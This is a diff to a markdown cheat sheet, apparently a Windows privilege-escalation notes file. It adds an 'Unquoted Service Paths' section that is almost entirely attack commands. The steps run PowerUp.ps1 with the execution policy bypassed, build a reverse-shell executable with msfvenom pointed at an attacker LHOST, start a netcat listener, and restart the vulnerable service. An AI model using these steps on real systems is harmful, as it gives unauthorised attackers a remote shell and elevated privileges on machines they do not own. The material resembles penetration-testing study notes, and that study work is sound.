@@ -311,7 +311,20 @@
   8. PROFIT!
 
 ### Unquoted Service Paths
-## CVE-2019-1388
-
-
-
+### Manually
+  1. Run PowerUp.ps1
+    ```cmd
+  powershell -ep bypass
+  . .\PowerUp.ps1
+  Invoke-AllChecks
+  ```
+  2. Create a msfvenom payload
+  ```bash
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <path.exe>
+  ```
+  3. Start a listener
+   ```bash
+  nc -nvlp <PORT>
+  ```
+  4. Start the service
+  5. Profit!
